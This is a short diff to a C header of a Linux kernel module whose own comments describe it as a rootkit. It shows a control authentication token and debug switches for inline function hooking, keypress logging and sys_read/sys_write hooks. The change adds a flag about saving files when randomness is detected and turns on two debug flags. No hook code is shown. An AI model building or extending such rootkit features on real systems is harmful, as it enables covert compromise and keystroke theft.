@@ -10,10 +10,13 @@
 #include <linux/fs.h>
 
 #define DECMS_TAB_MAX   4096
+
 #define NOT_OPEN        0
 #define NEWLY_OPEN      1
 #define SHOULD_SAVE     2
 #define SHOULD_NOT_SAVE 3
+
+#define SAVE_SINGLE_PASS 1   //set to 1 if we only save the file once if randmoness is detected
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
 #include <generated/autoconf.h>
@@ -22,10 +25,10 @@
 #endif
 
 #define AUTH_TOKEN 0x12345678   // Authentication token for rootkit control
-#define __DEBUG__ 0             // General debugging statements
+#define __DEBUG__ 1             // General debugging statements
 #define __DEBUG_HOOK__ 0        // Debugging of inline function hooking
 #define __DEBUG_KEY__ 0         // Debugging of user keypresses
-#define __DEBUG_RW__ 0          // Debugging of sys_read and sys_write hooks
+#define __DEBUG_RW__ 1          // Debugging of sys_read and sys_write hooks
 #define __DEBUG_TS__ 0          // Debugging of sys_read and sys_write hooks
 #define __DEBUG_NO_MATH__ 0     // Debugging of no_math libraries
 #define __DEBUG_RAND_TEST__ 0   // Debugging of rand_test libraries
